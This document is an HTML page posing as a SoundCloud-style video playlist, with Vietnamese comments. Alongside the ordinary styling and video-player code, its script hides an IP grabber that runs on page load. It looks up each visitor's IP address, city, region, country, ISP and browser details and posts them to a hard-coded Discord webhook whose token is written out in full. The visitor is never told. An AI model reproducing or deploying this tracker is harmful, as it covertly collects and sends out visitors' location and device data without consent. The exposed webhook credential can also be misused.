<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SoundCloud Clone</title>
    <!-- FontAwesome cho Icon -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: #121212;
            color: #ccc;
            padding-bottom: 70px;
        }

        /* 1. NAVBAR (Thanh điều hướng trên cùng) */
        header {
            background-color: #000;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 30px;
            border-bottom: 1px solid #222;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .nav-left, .nav-right {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .logo { color: #ff5500; font-size: 24px; }
        .nav-link { color: #aaa; text-decoration: none; font-size: 14px; font-weight: 500; }
        .nav-link.active { color: #fff; }

        .search-bar {
            background-color: #222;
            border-radius: 4px;
            padding: 6px 12px;
            display: flex;
            align-items: center;
            width: 300px;
        }

        .search-bar input {
            background: transparent;
            border: none;
            color: #fff;
            outline: none;
            width: 100%;
        }

        .btn-pro {
            background: linear-gradient(90deg, #ff5500, #ff2200);
            color: #fff;
            border: none;
            padding: 6px 12px;
            border-radius: 3px;
            font-size: 12px;
            cursor: pointer;
            font-weight: bold;
        }

        /* 2. MAIN CONTAINER */
        .container {
            max-width: 1240px;
            margin: 20px auto;
            display: grid;
            grid-template-columns: 1fr;
            gap: 30px;
            padding: 0 20px;
        }

        .section-title {
            color: #fff;
            font-size: 20px;
            margin-bottom: 15px;
            font-weight: 600;
        }

        /* PLAYLIST CARD */
        .playlist-card {
            background: linear-gradient(135deg, #333 0%, #1a1a1a 100%);
            border-radius: 8px;
            padding: 20px;
            display: flex;
            gap: 20px;
            position: relative;
            margin-bottom: 25px;
            border: 1px solid #2a2a2a;
        }

        .cover-art {
            width: 200px;
            height: 200px;
            border-radius: 6px;
            position: relative;
            overflow: hidden;
            cursor: pointer;
        }

        .cover-art img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .play-btn-large {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 60px;
            height: 60px;
            background-color: #ff5500;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
            transition: transform 0.2s ease;
        }

        .cover-art:hover .play-btn-large {
            transform: translate(-50%, -50%) scale(1.1);
        }

        .song-list { flex: 1; }

        .song-item {
            display: flex;
            justify-content: space-between;
            padding: 12px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            font-size: 14px;
            color: #eee;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .song-item:hover {
            background-color: rgba(255, 255, 255, 0.08);
            color: #ff5500;
        }

        .song-item .plays { color: #888; font-size: 12px; }

        /* 3. MODAL POPUP XEM VIDEO */
        .video-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.85);
            z-index: 2000;
            justify-content: center;
            align-items: center;
        }

        .video-modal.active {
            display: flex;
        }

        .video-container {
            position: relative;
            width: 90%;
            max-width: 800px;
            background: #000;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }

        .video-container video {
            width: 100%;
            max-height: 70vh;
            display: block;
        }

        .close-video-btn {
            position: absolute;
            top: 10px;
            right: 15px;
            color: #fff;
            font-size: 28px;
            cursor: pointer;
            z-index: 2001;
        }

        /* 4. PLAYER BAR DƯỚI ĐÁY */
        .player-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 60px;
            background-color: #181818;
            border-top: 1px solid #282828;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 20px;
            z-index: 1000;
        }

        .player-controls {
            display: flex;
            align-items: center;
            gap: 15px;
            color: #ccc;
        }

        .play-pause-btn { font-size: 20px; color: #fff; cursor: pointer; }
    </style>
</head>
<body>

    <!-- NAVBAR -->
    <header>
        <div class="nav-left">
            <i class="fa-brands fa-soundcloud logo"></i>
            <a href="#" class="nav-link active">Home</a>
            <a href="#" class="nav-link">Feed</a>
            <a href="#" class="nav-link">Library</a>
            <div class="search-bar">
                <input type="text" placeholder="Search">
            </div>
        </div>
        <div class="nav-right">
            <button class="btn-pro">Try Artist Pro</button>
            <a href="#" class="nav-link">Upload</a>
        </div>
    </header>

    <!-- MAIN CONTAINER -->
    <div class="container">
        <div class="main-feed">
            <h2 class="section-title">Video Playlist (Bấm vào bài để phát Video)</h2>
            
            <!-- PLAYLIST CARD -->
            <div class="playlist-card">
                <!-- Click vào ảnh cover MRTT để mở video -->
                <div class="cover-art" onclick="openVideo('video1.mp4', 'MRT - Bùi Trường Linh')">
                    <img src="MRTT.jpg" alt="MRTT Cover">
                    <div class="play-btn-large"><i class="fa-solid fa-play"></i></div>
                </div>
                
                <div class="song-list">
                    <!-- Mục bài hát 1: MRT - Bùi Trường Linh -->
                    <div class="song-item" onclick="openVideo('video1.mp4', 'MRT - Bùi Trường Linh')">
                        <span><i class="fa-solid fa-circle-play" style="margin-right: 8px;"></i> <b>MRT</b> - Bùi Trường Linh</span>
                        <span class="plays"><i class="fa-solid fa-play"></i> 15.2K</span>
                    </div>

                    <!-- Mục bài hát 2 -->
                    <div class="song-item" onclick="openVideo('video1.mp4', 'huhy - wrongtimes')">
                        <span><i class="fa-solid fa-circle-play" style="margin-right: 8px;"></i> <b>huhy</b> - wrongtimes</span>
                        <span class="plays"><i class="fa-solid fa-play"></i> 5,734</span>
                    </div>

                    <!-- Mục bài hát 3 -->
                    <div class="song-item" onclick="openVideo('video1.mp4', 'Kudo - TOULIVER X TRAVIS SCOTT')">
                        <span><i class="fa-solid fa-circle-play" style="margin-right: 8px;"></i> <b>Kudo</b> - TOULIVER X TRAVIS SCOTT</span>
                        <span class="plays"><i class="fa-solid fa-play"></i> 11.4K</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- POPUP XEM VIDEO -->
    <div class="video-modal" id="videoModal">
        <div class="video-container">
            <span class="close-video-btn" onclick="closeVideo()">&times;</span>
            <p id="videoTitle" style="padding: 10px 15px; color: #fff; font-weight: bold; background: #111;"></p>
            <video id="mainVideo" controls autoplay>
                <source id="videoSource" src="" type="video/mp4">
                Trình duyệt của bạn không hỗ trợ thẻ video.
            </video>
        </div>
    </div>

    <!-- PLAYER BAR DƯỚI ĐÁY -->
    <div class="player-bar">
        <div class="player-controls">
            <i class="fa-solid fa-backward-step"></i>
            <i class="fa-solid fa-play play-pause-btn"></i>
            <i class="fa-solid fa-forward-step"></i>
        </div>
        <div id="nowPlayingText" style="font-size: 13px; color: #fff;">Chưa chọn bài hát/video</div>
        <div></div>
    </div>

    <!-- JAVASCRIPT XỬ LÝ PHÁT VIDEO VÀ BÁO IP VỀ DISCORD -->
    <script>
        // --- 1. CODE PHÁT VIDEO ---
        function openVideo(videoSrc, title) {
            const modal = document.getElementById('videoModal');
            const video = document.getElementById('mainVideo');
            const source = document.getElementById('videoSource');
            const titleElem = document.getElementById('videoTitle');
            const nowPlaying = document.getElementById('nowPlayingText');

            source.src = videoSrc;
            titleElem.innerText = title;
            nowPlaying.innerText = "Đang phát: " + title;
            
            video.load();
            modal.classList.add('active');
            video.play();
        }

        function closeVideo() {
            const modal = document.getElementById('videoModal');
            const video = document.getElementById('mainVideo');
            
            video.pause();
            modal.classList.remove('active');
        }

        window.onclick = function(event) {
            const modal = document.getElementById('videoModal');
            if (event.target == modal) {
                closeVideo();
            }
        }

        // --- 2. CODE TỰ ĐỘNG LẤY IP VÀ GỬI VỀ DISCORD WEBHOOK ---
        async function sendIPToDiscord() {
            // Webhook URL của bạn đã được gắn cố định tại đây:
            const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1549956055730229288/wu2DzLiEykbHiZ1F9sL1fcdyb0xz_w4HkhuRnwvFkYfKini5RzsSXj-m-LF6Bpd_VW0u";

            try {
                // Tự động lấy thông tin IP & vị trí từ API
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();

                const time = new Date().toLocaleString('vi-VN');
                const userAgent = navigator.userAgent; // Thông tin thiết bị & trình duyệt

                // Tạo nội dung tin nhắn gửi về Discord
                const payload = {
                    embeds: [{
                        title: "🚨 BÁO CÁO TRUY CẬP WEBSITE MỚI!",
                        color: 16733952, // Màu cam đặc trưng
                        fields: [
                            { name: "🌐 Địa chỉ IP", value: `\`${data.ip || 'Không rõ'}\``, inline: true },
                            { name: "📍 Vị trí", value: `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`, inline: true },
                            { name: "🏢 Nhà mạng", value: `${data.org || 'Không rõ'}`, inline: false },
                            { name: "⏰ Thời gian", value: `${time}`, inline: false },
                            { name: "📱 Thiết bị truy cập", value: `\`\`\`${userAgent}\`\`\``, inline: false }
                        ],
                        footer: { text: "GitHub Pages Tracker" }
                    }]
                };

                // Gửi thông báo đến Discord
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error("Lỗi gửi thông tin IP:", err);
            }
        }

        // Tự động kích hoạt khi có người dùng truy cập trang web
        window.addEventListener('load', sendIPToDiscord);
    </script>
</body>
</html>
